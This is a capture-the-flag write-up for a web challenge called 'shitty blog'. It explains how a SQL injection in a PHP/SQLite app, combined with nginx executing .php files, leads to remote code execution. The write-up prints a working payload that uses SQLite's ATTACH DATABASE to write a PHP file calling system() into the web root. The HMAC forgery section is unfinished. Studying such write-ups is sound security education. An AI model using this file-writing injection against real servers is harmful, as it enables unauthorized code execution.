shitty blog 🤎
=====

Writeup by: ath0 and qxxxb


Challenge Author: 0xbb

Files: shitty blog 🤎-a6c0b8b672817005.tar.xz 


Overview
=====

The main logic of the challenges resides in one file, index.php.

There is a per-session SQLite database that gets created at `/var/www/html/data/` + `md5($salt.'|'.$id.'|'.$mac);`. In the session cookie, there is a user id (`$id`) and a HMAC which will be verified:

```
    $session = explode('|', $_COOKIE['session']);
    if( ! hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])) {
        exit();
    }
    $id = $session[0];
    $mac = $session[1];
```

If we can forge a valid HMAC, we can move forward with a totally controlled $id (more on the forgery later).

qxxxb noticed some interesting bits in the nginx config:

```
location / {
        try_files $uri $uri/ =404;
}
```

We can visit http://localhost:8888/data/<sandbox_url>/blog.sqlite3 and we'll be able to read our sqlite database back. But this doesn't help us achive our ultimate goal: We need to execute /readflag (neither nginx nor php have the ability to read flag.txt directly) -- so we need RCE. The other thing to note is nginx is setup to send any file ending in .php through the php interpreter:

```
location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.4-fpm.sock;
}
```

So if we can write a .php file somewhere in /var/www/html/ we can just visit that URL and it will get executed! But how can we create such a file?


Luckily, there's another vulnerability which is likely the first thing you'll notice when scanning index.php:

```
function delete_entry($db, $entry_id, $user_id) {
    $db->exec("DELETE from entry WHERE {$user_id} <> 0 AND id = {$entry_id}");
}
```

SQL injection on user_id! So if we can cram a SQL injection payload into $user_id, we can use any of the capabilities of SQLite.


Exploit
=====

SQL injection to RCE
----

Assuming we can control the user id (requires HMAC forgery, below), how will we get code execution?

Some [cheat sheet](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet) I found online shows you can create SQLite databases with arbitrary names:

```
1';ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('hax'); --
```

And nginx is setup to send any file ending in .php through the php interpreter:

```
location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.4-fpm.sock;
}
```

So our SQL injection payload just needs to create a file at `/var/www/html/data/lol-abcdefg.php` containing `<?php system('/readflag;') ?>` anywhere within the file.

So the SQL injection payload we need (with quotes correctly encoded) is:

```
'; ATTACH DATABASE '/var/www/html/data/lol-abcdefg.php' AS lol; CREATE TABLE lol.pwn (dataz test); INSERT INTO lol.pwn (dataz) VALUES ('<?php system(''/readflag'') ?>'); -- 
```

(the `--` at the end starts a comment)

Forging a HMAC
=====

todo